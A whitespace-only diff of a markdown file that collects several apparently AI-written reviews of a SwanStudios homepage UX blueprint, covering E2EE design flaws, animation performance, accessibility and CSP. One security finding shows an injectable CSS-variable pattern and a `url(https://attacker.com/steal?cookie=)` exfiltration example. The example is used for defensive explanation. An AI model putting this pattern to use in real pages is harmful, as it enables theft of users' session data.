@@ -294,11 +294,11 @@ True E2EE means:
 - Keys derived from user passphrase via PBKDF2/Argon2 on client
 - Server stores ONLY encrypted ciphertext — never sees keys
 - Recovery: user-generated BIP39 mnemonic backup phrase (12-24 words)
-  - User acknowledges: "If you lose your passphrase and backup phrase, 
+  - User acknowledges: "If you lose your passphrase and backup phrase,
     your data is permanently unrecoverable. SwanStudios cannot help."
 - NO server-assisted recovery (this would break the E2EE guarantee)
 - Sean sees "[Client-Encrypted Message — Cannot Be Read By SwanStudios]"
-- Legal: SwanStudios can provide ciphertext if legally compelled; 
+- Legal: SwanStudios can provide ciphertext if legally compelled;
   decryption is impossible without user key
 
 ### Implementation Note for Developers
@@ -344,7 +344,7 @@ If `theme.colors.iceWing` is ever updated (e.g., accessibility contrast adjustme
 ```markdown
 ## DESIGN TOKENS FOR ANIMATIONS
 
-⚠️ IMPLEMENTATION RULE: These values MUST be consumed from the 
+⚠️ IMPLEMENTATION RULE: These values MUST be consumed from the
 styled-components theme object, NOT hardcoded as CSS custom properties.
 CSS custom properties listed here are for REFERENCE ONLY.
 
@@ -414,8 +414,8 @@ backdrop-filter: blur(16px) on 8+ simultaneous cards
 const prefersReducedMotion = useReducedMotion(); // framer-motion hook
 const isMobile = useMediaQuery('(max-width: 768px)');
 
-const animationConfig = prefersReducedMotion || isMobile 
-  ? STATIC_FALLBACK 
+const animationConfig = prefersReducedMotion || isMobile
+  ? STATIC_FALLBACK
   : FULL_ANIMATION;
 ```
 
@@ -444,7 +444,7 @@ The component table lists 10 components with purpose and usage but **zero prop i
 // Developer A's ScrollReveal
 <ScrollReveal direction="up" delay={0.2}>
 
-// Developer B's ScrollReveal  
+// Developer B's ScrollReveal
 <ScrollReveal animation="fadeUp" staggerIndex={2}>
 
 // Developer C's ScrollReveal
@@ -560,17 +560,17 @@ The document mentions `prefers-reduced-motion` exactly once as a bullet point fe
 
 # Security Audit Report: SwanStudios Homepage/About UX Overhaul Blueprint
 
-**Auditor:** Step 3.5 Flash (SWE-bench 74.4%)  
-**Target:** `docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-UX-OVERHAUL-PLAN.md`  
-**Scope:** Design blueprint document (no executable code)  
-**Date:** 2025-04-05  
+**Auditor:** Step 3.5 Flash (SWE-bench 74.4%)
+**Target:** `docs/ai-workflow/blueprints/HOMEPAGE-ABOUT-UX-OVERHAUL-PLAN.md`
+**Scope:** Design blueprint document (no executable code)
+**Date:** 2025-04-05
 **Context:** Reviewing a UX/UI design specification for potential security implications in implementation.
 
 ---
 
 ## Executive Summary
 
-**Overall Risk: LOW**  
+**Overall Risk: LOW**
 This document is a **design blueprint** containing no executable code, API endpoints, or authentication logic. It specifies visual/UX enhancements (parallax, animations, glass morphism) and a high-level encryption model. **No direct security vulnerabilities exist in this document itself.** However, the **proposed encryption model contains critical design gaps** that, if implemented as described, would create severe security failures. The animation specifications also introduce **potential client-side performance/security risks** if implemented without safeguards.
 
 ---
@@ -578,34 +578,34 @@ This document is a **design blueprint** containing no executable code, API endpo
 ## Detailed Findings
 
 ### 1. OWASP Top 10
-**Status:** NOT APPLICABLE  
+**Status:** NOT APPLICABLE
 *Reason:* Document contains no server-side code, database queries, or request handling logic. No injection surfaces, auth flows, or SSRF vectors are described.
 
 ### 2. Client-Side Security
-**Status:** NOT APPLICABLE (but implementation risk exists)  
+**Status:** NOT APPLICABLE (but implementation risk exists)
 *Reason:* No `localStorage` usage, API keys, or `eval()` are mentioned in the blueprint. However, the proposed animation stack (framer-motion, CSS Scroll-Driven Animations) will execute JavaScript in the client. **Implementation must ensure:**
 - No sensitive data (PII, tokens) is passed to animation components as props that could leak to console/network.
 - Animation libraries are kept updated (framer-motion supply-chain risk).
 - CSS `backdrop-filter` and `transform` are used cautiously to avoid GPU overuse on mobile (DoS risk).
 
 ### 3. Input Validation
-**Status:** NOT APPLICABLE  
+**Status:** NOT APPLICABLE
 *Reason:* No user input handling is described in this UX blueprint.
 
 ### 4. CORS & CSP
-**Status:** NOT APPLICABLE  
+**Status:** NOT APPLICABLE
 *Reason:* No server configuration or HTTP headers are specified.
 
 ### 5. Authentication
-**Status:** NOT APPLICABLE  
+**Status:** NOT APPLICABLE
 *Reason:* No JWT, session, or login flows are described.
 
 ### 6. Authorization
-**Status:** NOT APPLICABLE  
+**Status:** NOT APPLICABLE
 *Reason:* No RBAC or privilege checks are mentioned.
 
 ### 7. Data Exposure
-**Status:** NOT APPLICABLE (but implementation risk exists)  
+**Status:** NOT APPLICABLE (but implementation risk exists)
 *Reason:* No logs, console statements, or network responses are defined. However, the **Encryption Model Update** section describes data handling that could lead to exposure if implemented incorrectly.
 
 ---
@@ -613,43 +613,43 @@ This document is a **design blueprint** containing no executable code, API endpo
 ## Critical Security Design Flaw: Encryption Model
 
 ### Finding: E2EE Implementation is Fundamentally Broken
-**Severity:** CRITICAL  
+**Severity:** CRITICAL
 **Location:** "Encryption Model Update" section
 
 **Issue:** The proposed two-tier encryption model contains irreconcilable contradictions that **completely undermine the security guarantees of "End-to-End Encryption" (E2EE)**.
 
 **Technical Analysis:**
-1. **Key Management Ambiguity:**  
-   - Level 2 claims: "Messages encrypted client-side, server stores only encrypted blobs. EVEN SwanStudios cannot read the messages."  
-   - But also: "User MUST understand: lose device + lose backup key = messages gone forever."  
+1. **Key Management Ambiguity:**
+   - Level 2 claims: "Messages encrypted client-side, server stores only encrypted blobs. EVEN SwanStudios cannot read the messages."
+   - But also: "User MUST understand: lose device + lose backup key = messages gone forever."
    - **Flaw:** If the server *never* has the key, how does the user "lose backup key"? The backup key must be stored *somewhere* accessible for recovery. If stored server-side, the server can decrypt. If stored client-side only, losing the device loses the key (as stated). This is a **contradiction**.
 
-2. **Recovery Window Contradiction:**  
-   - "Recovery window: 24-48 hours with proper credentials" for E2EE accounts.  
+2. **Recovery Window Contradiction:**
+   - "Recovery window: 24-48 hours with proper credentials" for E2EE accounts.
    - **Flaw:** In true E2EE, the server *cannot* decrypt messages even with "proper credentials." Recovery implies the server can re-encrypt or access plaintext, breaking E2EE. This is either:
      - A **backdoor** (server holds recovery keys), or
      - **Impossible** (no recovery possible, period).
 
-3. **Admin Dashboard Visibility:**  
-   - "Sean sees '[Encrypted Message]' in admin for E2EE conversations."  
+3. **Admin Dashboard Visibility:**
+   - "Sean sees '[Encrypted Message]' in admin for E2EE conversations."
    - **Flaw:** If the admin sees *only* `[Encrypted Message]`, that's consistent with E2EE. But the recovery mechanism suggests the admin could *decrypt* with credentials. The document is ambiguous whether the admin can ever see plaintext of E2EE messages. Ambiguity here is a **critical design flaw**—it must be explicitly defined and enforced technically.
 
-4. **Key Storage Speculation:**  
+4. **Key Storage Speculation:**
    The only way to have both "E2EE" and "recovery" is to:
    - Store user encryption keys **encrypted with a recovery key** on the server.
    - But then the server *could* decrypt those keys if it wanted to (or if compromised). The "E2EE" label becomes misleading.
 
-**Impact:**  
+**Impact:**
 - Users are given a **false sense of security**—they believe messages are unreadable by SwanStudios, but the recovery feature implies otherwise.
 - Legal/compliance risk: Marketing E2EE while having recovery backdoors could violate privacy regulations (GDPR, CCPA) if not disclosed.
 - Privilege escalation: An admin with "proper credentials" could potentially decrypt any E2EE message during the recovery window.
 
-**Recommendation:**  
+**Recommendation:**
 Choose **one** model:
 - **True E2EE:** No server-side recovery. Users must backup keys offline. Admin *never* sees plaintext. Recovery is impossible.
 - **Server-Side Encryption with Recovery:** Don't call it E2EE. Call it "Zero-Knowledge Encryption with Recovery" if keys are client-derived but backed up encrypted by server. Be transparent.
 
-**Fix Required:**  
+**Fix Required:**
 Rewrite the encryption section with:
 1. Clear key lifecycle diagram (generation, storage, backup, recovery).
 2. Explicit statement: "Server can/cannot decrypt E2EE messages under any circumstances."
@@ -661,7 +661,7 @@ Rewrite the encryption section with:
 ## Medium Risk: Animation Implementation Vulnerabilities
 
 ### Finding: Client-Side Animation DoS via GPU Overload
-**Severity:** MEDIUM  
+**Severity:** MEDIUM
 **Location:** "Parallax Effects" and "Scroll-Triggered Section Reveals" sections
 
 **Issue:** The blueprint mandates **12+ sections with simultaneous parallax, scroll-triggered animations, glass morphism, and particle effects**. On low-end devices, this could:
@@ -675,11 +675,11 @@ Rewrite the encryption section with:
 - `backdrop-filter: blur(16px)` is notoriously expensive on mobile (forces layer promotion, memory usage).
 - "FloatingParticles" with 0.03 opacity still requires canvas/DOM updates on scroll.
 
-**Impact:**  
+**Impact:**
 - Poor user experience on mid/low-end devices (target audience: wealthy golf clients may use high-end devices, but staff/administrators may not).
 - Potential for **client-side DoS** if animations are not optimized (e.g., using `will-change`, limiting simultaneous animations, using `IntersectionObserver` thresholds).
 
-**Recommendation:**  
+**Recommendation:**
 Add implementation constraints to blueprint:
 - **Performance budget:** Max 3 simultaneous parallax layers per viewport.
 - **Mobile-specific:** Disable particle effects, reduce blur radius to `8px`, use `transform: translateZ(0)` sparingly.
@@ -691,7 +691,7 @@ Add implementation constraints to blueprint:
 ## Low Risk: Design Token Exposure
 
 ### Finding: CSS Custom Properties in Global Scope
-**Severity:** LOW  
+**Severity:** LOW
 **Location:** "Design Tokens for Animations" section
 
 **Issue:** The CSS variables (e.g., `--glow-ice: 0 0 20px rgba(96, 192, 240, 0.3)`) are defined in a global scope. If these tokens are ever used in **dynamic styles** (e.g., `style={{ boxShadow: `var(--glow-${type}` }}` in React), it could open **CSS injection** if `type` is user-controlled.
@@ -703,11 +703,11 @@ Add implementation constraints to blueprint:
 ```
 An attacker could set `glowType` to `; background: red;` and inject arbitrary CSS.
 
-**Impact:**  
+**Impact:**
 - Low: No user input is mentioned in this blueprint, but future components (e.g., user-customizable dashboard) might reuse these tokens.
 - CSS injection can lead to **session hijacking** (e.g., stealing `localStorage` tokens via `::selection { background: url(https://attacker.com/steal?cookie=) }`).
 
-**Recommendation:**  
+**Recommendation:**
 - Document that design tokens must be used **statically only** (no string interpolation from user data).
 - If dynamic theming is needed, use a **allowlist** of token names.
 
@@ -725,12 +725,12 @@ An attacker could set `glowType` to `; background: red;` and inject arbitrary CS
 
 ## Actionable Recommendations
 
-1. **Immediate (Critical):**  
+1. **Immediate (Critical):**
    - Halt any implementation of the encryption model until a cryptographer reviews and resolves the E2EE/recovery contradiction.
    - Decide: **True E2EE (no recovery)** OR **Server-side encryption with recovery (don't call it E2EE)**.
 
-2. **Short-Term (Medium):**  
-   - Add performance constraints to the blueprint:  
+2. **Short-Term (Medium):**
+   - Add performance constraints to the blueprint:
      ```md
      ## PERFORMANCE REQUIREMENTS
      - All animations must pass Lighthouse "Performance" > 90 on mobile emulation.
@@ -739,7 +739,7 @@ An attacker could set `glowType` to `; background: red;` and inject arbitrary CS
      ```
    - Include `prefers-reduced-motion` compliance checklist in component specs.
 
-3. **Long-Term (Low):**  
+3. **Long-Term (Low):**
    - Document safe usage of CSS custom properties: "Never interpolate user data into `var(--token)` names."
    - Consider using **CSS-in-JS with static token references** (e.g., `css` prop with literal strings) to avoid injection.
 
@@ -769,45 +769,45 @@ As a Performance and Scalability Engineer, I have reviewed the **HOMEPAGE-ABOUT-
 ---
 
 ### 1. Bundle Size Impact
-**Finding: Framer Motion Bloat**  
+**Finding: Framer Motion Bloat**
 **Rating: HIGH**
 *   **Issue:** The plan relies heavily on `framer-motion`. While already in the project, using it for 12+ sections with complex variants will significantly increase the main thread execution time during hydration.
 *   **Recommendation:** Use `m` from `framer-motion` (the minimal version) and `LazyMotion` features. For simple reveals, prefer the **CSS Scroll-Driven Animations API** mentioned in the doc, as it has zero JS bundle cost.
 
 ### 2. Render Performance
-**Finding: TextSplitter DOM Explosion**  
+**Finding: TextSplitter DOM Explosion**
 **Rating: CRITICAL**
 *   **Issue:** "Split text into chars/words with stagger animation" creates a new DOM node (`<span>`) for every single letter. On a content-heavy page, this can increase the DOM node count by 500-1000%, leading to massive layout recalculation costs during scroll.
 *   **Recommendation:** Limit character-level splitting to Hero H1s only. Use word-level or line-level splitting for body text. Ensure `will-change: transform` is applied to animated elements to promote them to GPU layers.
 
-**Finding: Scroll-Linked State vs. Compositor**  
+**Finding: Scroll-Linked State vs. Compositor**
 **Rating: HIGH**
 *   **Issue:** Using `useScroll` + `useTransform` (JS-based) for parallax forces the main thread to calculate positions on every scroll event. If the main thread is busy, the parallax will "jank" (stutter).
 *   **Recommendation:** Prioritize the `animation-timeline: scroll()` approach for background parallax. It runs on the compositor thread and stays smooth even if the JS main thread is blocked.
 
 ### 3. Network Efficiency
-**Finding: Video & Asset Weight**  
+**Finding: Video & Asset Weight**
 **Rating: MEDIUM**
 *   **Issue:** Hero videos and "Ken Burns" effects on images can lead to high LCP (Largest Contentful Paint) times.
-*   **Recommendation:** 
+*   **Recommendation:**
     *   Implement **Priority Hints** (`fetchpriority="high"`) for the Hero video.
     *   Use WebP/AVIF for all "Crystalline" assets.
     *   Ensure video backgrounds are served via a CDN with byte-range requests (streaming).
 
 ### 4. Memory Leaks & Cleanup
-**Finding: IntersectionObserver Overload**  
+**Finding: IntersectionObserver Overload**
 **Rating: LOW**
 *   **Issue:** `whileInView` creates many Intersection Observers. While generally efficient, 18+ sections of observers need careful management.
 *   **Recommendation:** Use a single root observer for the page or ensure `viewport={{ once: true }}` is set for animations that don't need to re-trigger, allowing the browser to garbage collect the observer.
 
 ### 5. Lazy Loading
-**Finding: Monolithic Component Loading**  
+**Finding: Monolithic Component Loading**
 **Rating: HIGH**
 *   **Issue:** The plan lists 10+ new "Reusable Animation Components." If these are all imported into the `Home.tsx` file, the initial JS payload will balloon.
 *   **Recommendation:** Use `React.lazy()` for sections below the fold (e.g., "Client Success Stories," "Beyond the Gym"). Use an `IntersectionObserver` to trigger the dynamic import of the component code only when the user scrolls near that section.
 
 ### 6. Scalability Concerns (Backend/E2EE)
-**Finding: E2EE Searchability & Indexing**  
+**Finding: E2EE Searchability & Indexing**
 **Rating: MEDIUM**
 *   **Issue:** The "Level 2: E2EE" update means the backend cannot index or search message content.
 *   **Recommendation:** Ensure the UI handles "Search" gracefully for E2EE users (e.g., searching only by metadata/date, or performing client-side decryption and search in a Web Worker).
@@ -1100,8 +1100,8 @@ The proposed UX overhaul blueprint is ambitious and visually compelling, but it 
 
 ## Executive Summary
 
-**Document Type:** Design Specification / UX Blueprint (Markdown)  
-**Reviewed:** 2026-04-05  
+**Document Type:** Design Specification / UX Blueprint (Markdown)
+**Reviewed:** 2026-04-05
 **Verdict:** PENDING — Contains CRITICAL architectural flaws in the encryption model, inconsistent design tokens, unverified technical assumptions, and scope creep that threatens production delivery.
 
 ---
@@ -1172,7 +1172,7 @@ Use opacity variation only — never swap the underlying color family.
 
 5 components appear in BOTH the Homepage AND About sections lists but are NOT in the Reusable Animation Components table:
 - `ParallaxLayer`
-- `GlassCard`  
+- `GlassCard`
 - `AnimatedCounter`
 - `TextSplitter`
 - `ScrollReveal` (mentioned but no dedicated component entry)
@@ -1383,7 +1383,7 @@ But provides **zero guidance** on:
 - [ ] Parallax backgrounds must be `aria-hidden="true"`
 - [ ] Counter animations must announce final values via `aria-live="polite"`
 
-### Keyboard Navigation  
+### Keyboard Navigation
 - [ ] All interactive elements in focus order
 - [ ] Parallax must not trap keyboard focus
 - [ ] Escape key exits any modal/overlay immediately
@@ -1545,9 +1545,9 @@ This review evaluates your `HOMEPAGE-ABOUT-UX-OVERHAUL-PLAN.md`. As **Gemini 3.1
 
 ### 6. Accessibility Gaps
 *   **Finding:** The plan mentions `prefers-reduced-motion` but lacks specific implementation details.
-*   **Recommendation:** 
-    *   **Motion:** Use `framer-motion`'s `reducedMotion` config globally. 
-    *   **Visuals:** Ensure that the "Glassmorphism" blur does not reduce text contrast below WCAG 2.1 AA standards. High-blur backgrounds can make text unreadable for users with visual impairments. 
+*   **Recommendation:**
+    *   **Motion:** Use `framer-motion`'s `reducedMotion` config globally.
+    *   **Visuals:** Ensure that the "Glassmorphism" blur does not reduce text contrast below WCAG 2.1 AA standards. High-blur backgrounds can make text unreadable for users with visual impairments.
     *   **Focus:** Ensure the "Cursor-following spotlight" does not interfere with keyboard focus indicators.
 *   **Rating:** **CRITICAL**
 
@@ -1880,12 +1880,12 @@ Plus CSS Scroll-Driven Animations running in parallel with Framer Motion. The da
 ## [PASS] Security II (Nemotron)
 **Model:** nvidia/nemotron-3-super-120b-a12b-20230311:free | **Duration:** 110.4s
 
-## Security Review – Design Blueprint (HOMEPAGE‑ABOUT‑UX‑OVERHAUL‑PLAN.md)  
+## Security Review – Design Blueprint (HOMEPAGE‑ABOUT‑UX‑OVERHAUL‑PLAN.md)
 *Second opinion – focuses on gaps a typical code‑level scan (Step 3.5 Flash) would likely overlook.*
 
----  
+---
 
-### 1. Data Flow Analysis  
+### 1. Data Flow Analysis
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **No explicit PII handling guidance** | The doc describes UI/UX upgrades but never mentions how personal data (names, emails, phone numbers) entered via forms, testimonials, or admin dashboards will be collected, stored, or transmitted. Absence of guidance increases risk of accidental logging or exposure. | **MEDIUM** |
@@ -1893,58 +1893,58 @@ Plus CSS Scroll-Driven Animations running in parallel with Framer Motion. The da
 | **Analytics / telemetry** | No reference to whether scroll‑triggered animations or interaction events (e.g., hover, counters) are sent to third‑party analytics. If implemented without scrutiny, PII could be leaked via event payloads. | **LOW** |
 | **Backup / export of E2EE blobs** | The design notes that E2EE data cannot be decrypted by SwanStudios, but does not state how backups are handled. If backups retain raw encrypted blobs *and* the key material (e.g., user‑derived keys) are stored alongside, recovery could unintentionally expose plaintext. | **MEDIUM** |
 
----  
+---
 
-### 2. API Boundary Security  
+### 2. API Boundary Security
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **Missing authn/authz details for new UI‑driven endpoints** | The upgrade adds many interactive components (e.g., animated counters, hover‑glow, sticky nav). Implicitly these will call backend APIs (e.g., to fetch trainer data, submit testimonials). The doc does not specify whether these endpoints will require JWT/session validation, role‑based access, or rate limiting. | **HIGH** |
 | **No mention of input validation schemas** | Forms that collect user data (e.g., contact, sign‑up) are not described with validation (length, type, regex). Without server‑side validation, injection or abuse vectors remain. | **MEDIUM** |
 | **Absence of API versioning / deprecation policy** | As the UI evolves, backward‑compatible API changes may be needed. No guidance on versioning could lead to breaking changes that expose internal debug endpoints. | **LOW** |
 
----  
+---
 
-### 3. Dependency Chain Risks  
+### 3. Dependency Chain Risks
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **Reliance on framer‑motion without version pinning** | The doc states “Framer Motion (already in the project)” but does not lock to a specific, vetted version. Unconstrained upgrades could introduce supply‑chain risks (e.g., compromised npm package). | **LOW** |
 | **No mention of Subresource Integrity (SRI) for CDN‑loaded assets** | If any animation libraries or fallback polyfills are loaded from a CDN, the design does not require SRI hashes, leaving room for tampering. | **LOW** |
-| **Potential use of unvetted UI‑kit components** | The proposed reusable components (`ScrollReveal`, `GlassCard`, etc.) are to be built in‑house, but the doc does not reference any internal security review process for new components. | **MEDIUM** |  
+| **Potential use of unvetted UI‑kit components** | The proposed reusable components (`ScrollReveal`, `GlassCard`, etc.) are to be built in‑house, but the doc does not reference any internal security review process for new components. | **MEDIUM** |
 
----  
+---
 
-### 4. Cryptographic Safety  
+### 4. Cryptographic Safety
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **Key management for server‑side encryption not detailed** | AES‑256 at rest is mentioned, but the doc omits how keys are generated, stored, rotated, and protected (e.g., HSM, KMS, env‑var leakage). Weak key storage would undermine the entire encryption claim. | **HIGH** |
 | **E2EE key derivation & user‑backup process vague** | “User MUST understand: lose device + lose backup key = messages gone forever” is a warning, but no specification of how the backup key is generated (e.g., PBKDF2, scrypt), where it is stored, or whether it is ever transmitted to the server. Poor key derivation could lead to brute‑force recovery. | **HIGH** |
 | **No forward secrecy or post‑compromise protection** | The design does not discuss re‑keying, session key rotation, or impact of a compromised user device on past/future messages. | **MEDIUM** |
 | **Admin access to non‑E2EE data lacks cryptographic audit** | While admins can view non‑E2EE data, the doc does not mention encryption of admin session tokens, audit logging of data access, or separation of duties. | **MEDIUM** |
-| **Token generation / session handling not addressed** | No reference to how authentication tokens are created (entropy, length), stored (HttpOnly, Secure, SameSite), or rotated. Missing details could allow session hijacking. | **MEDIUM** |  
+| **Token generation / session handling not addressed** | No reference to how authentication tokens are created (entropy, length), stored (HttpOnly, Secure, SameSite), or rotated. Missing details could allow session hijacking. | **MEDIUM** |
 
----  
+---
 
-### 5. Infrastructure Security  
+### 5. Infrastructure Security
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **CORS, CSP, and HSTS not referenced** | The visual upgrades will increase the attack surface (more DOM interactions, external fonts, possibly third‑party widgets). Absence of explicit CSP directives (e.g., `script-src 'self'`, `style-src 'self' 'unsafe-inline'` only if needed) and HSTS could leave click‑jacking, data‑exfiltration, or downgrade risks. | **MEDIUM** |
 | **Secure cookie flags omitted** | If session or auth cookies are used, the doc does not mandate `Secure; HttpOnly; SameSite=Strict` attributes, raising exposure to MITM or CSRF. | **MEDIUM** |
 | **No mention of TLS enforcement / certificate pinning** | While likely implied by production host, the design does not state enforcement of HTTPS‑only (e.g., via HSTS preload, redirect rules) or certificate transparency monitoring. | **LOW** |
 | **Logging and monitoring of security events** | No reference to centralized logging of auth failures, anomalous API usage, or encryption‑key access events. | **LOW** |
-| **DDoS / rate‑limiting considerations** | Animated, scroll‑driven pages may increase request volume (e.g., lazy‑loaded images, analytics pings). No mention of edge‑level rate limiting or WAF rules. | **LOW** |  
+| **DDoS / rate‑limiting considerations** | Animated, scroll‑driven pages may increase request volume (e.g., lazy‑loaded images, analytics pings). No mention of edge‑level rate limiting or WAF rules. | **LOW** |
 
----  
+---
 
-### 6. Privacy Compliance (GDPR/CCPA)  
+### 6. Privacy Compliance (GDPR/CCPA)
 | Finding | Description | Rating |
 |---------|-------------|--------|
 | **Data minimisation not addressed** | The design adds many decorative elements but does not discuss limiting collection of personal data to what is strictly necessary (e.g., avoiding collection of phone numbers unless required for service). | **MEDIUM** |
 | **Consent tracking missing** | No description of how user consent for analytics, marketing, or E2EE opt‑in will be recorded, stored, or made withdrawable. | **MEDIUM** |
 | **Right‑to‑deletion for E2EE data problematic** | If a user requests deletion, the server can only delete the encrypted blob; without the key the data is effectively unrecoverable, but the controller may still be deemed to retain “personal data” under GDPR if the key is derivable from stored material. The doc does not clarify a verifiable deletion mechanism. | **HIGH** |
 | **Data portability & access requests** | No outline of how users can export their non‑E2EE data in a portable format, or how E2EE blobs would be provided (still encrypted) alongside instructions for key use. | **MEDIUM** |
-| **Privacy policy & notice updates** | The UX overhaul will change data flows (e.g., new interactive forms, analytics). No mention of updating privacy notices or conducting a DPIA (Data Protection Impact Assessment) for the new features. | **MEDIUM** |  
+| **Privacy policy & notice updates** | The UX overhaul will change data flows (e.g., new interactive forms, analytics). No mention of updating privacy notices or conducting a DPIA (Data Protection Impact Assessment) for the new features. | **MEDIUM** |
 
----  
+---
 
 ## Summary of High‑Impact Gaps (Primary Scan Likely to Miss)
 
@@ -1957,17 +1957,17 @@ Plus CSS Scroll-Driven Animations running in parallel with Framer Motion. The da
 | **Infrastructure** | • Missing CSP/HSTS/secure cookie directives (MEDIUM) |
 | **Dependencies** | • No version pinning / SRI for framer‑motion or CDN assets (LOW‑MEDIUM) |
 
----  
+---
 
 ### Recommendations (to close the gaps)
 
-1. **Key Management** – Adopt a managed KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault) with automatic rotation; store only key identifiers in the app. Document HSM usage if applicable.  
-2. **E2EE Design** – Specify a standard protocol (e.g., libsodium‑based sealed boxes) with explicit user‑generated passphrase → Argon2id key derivation, encrypted backup stored user‑side (e.g., downloadable recovery file). Provide clear UI warnings and a verifiable “delete account” flow that removes both blobs and any server‑side key material.  
-3. **API Security** – Enforce JWT/OAuth2 validation on all new endpoints, apply role‑based access (RBAC) for trainer/admin data, and add global rate limiting (e.g., 100 req/min per IP) with burst allowances. Log authentication failures and anomalous access patterns.  
-4. **Privacy By Design** – Implement a consent‑management platform (e.g., OneTrust, Cookiebot) that records opt‑in/opt‑out for analytics, marketing, and E2EE. Conduct a DPIA for the new interactive sections and update the privacy policy accordingly.  
-5. **Infrastructure Hardening** – Deploy a strict CSP (e.g., `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src 'self' https://api.swanstudios.com;`), enable HSTS with `includeSubDomains; preload`, and enforce `Secure; HttpOnly; SameSite=Strict` on session cookies.  
-6. **Dependency Governance** – Lock framer‑motion to a vetted version (e.g., `^11.5.4`) in `package.json`, run `npm audit`/`yarn audit` CI gate, and consider using `npm-ci` + `package-lock.json` verification. Add SRI hashes for any CDN‑fallback resources.  
-7. **Component Security Review** – Before merging any new UI component (`GlassCard`, `ScrollReveal`, etc.), run a static analysis (ESLint security plugins) and a manual review for DOM‑based XSS vectors (e.g., ensuring any user‑prop is properly escaped).  
+1. **Key Management** – Adopt a managed KMS (AWS KMS, GCP Cloud KMS, Azure Key Vault) with automatic rotation; store only key identifiers in the app. Document HSM usage if applicable.
+2. **E2EE Design** – Specify a standard protocol (e.g., libsodium‑based sealed boxes) with explicit user‑generated passphrase → Argon2id key derivation, encrypted backup stored user‑side (e.g., downloadable recovery file). Provide clear UI warnings and a verifiable “delete account” flow that removes both blobs and any server‑side key material.
+3. **API Security** – Enforce JWT/OAuth2 validation on all new endpoints, apply role‑based access (RBAC) for trainer/admin data, and add global rate limiting (e.g., 100 req/min per IP) with burst allowances. Log authentication failures and anomalous access patterns.
+4. **Privacy By Design** – Implement a consent‑management platform (e.g., OneTrust, Cookiebot) that records opt‑in/opt‑out for analytics, marketing, and E2EE. Conduct a DPIA for the new interactive sections and update the privacy policy accordingly.
+5. **Infrastructure Hardening** – Deploy a strict CSP (e.g., `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src 'self' https://api.swanstudios.com;`), enable HSTS with `includeSubDomains; preload`, and enforce `Secure; HttpOnly; SameSite=Strict` on session cookies.
+6. **Dependency Governance** – Lock framer‑motion to a vetted version (e.g., `^11.5.4`) in `package.json`, run `npm audit`/`yarn audit` CI gate, and consider using `npm-ci` + `package-lock.json` verification. Add SRI hashes for any CDN‑fallback resources.
+7. **Component Security Review** – Before merging any new UI component (`GlassCard`, `ScrollReveal`, etc.), run a static analysis (ESLint security plugins) and a manual review for DOM‑based XSS vectors (e.g., ensuring any user‑prop is properly escaped).
 
 Addressing these items will bring the design‑level security posture in line with the expectations of a premium, data‑responsible SaaS platform and reduce the likelihood of issues that a pure code‑scan might overlook.
 
@@ -2008,7 +2008,7 @@ CONSENSUS REACHED
 
 Excellent work. This is how design and engineering should collaborate. We have successfully protected the Crystalline Swan aesthetic—maintaining our high-end, vault-like luxury feel—while engineering WCAG 2.1 AA compliance directly into the platform's DNA. No compromises. No degraded fallbacks.
 
-You have my official sign-off to generate the Engineering Implementation Tickets based on the following finalized blueprints. 
+You have my official sign-off to generate the Engineering Implementation Tickets based on the following finalized blueprints.
 
 ***
 
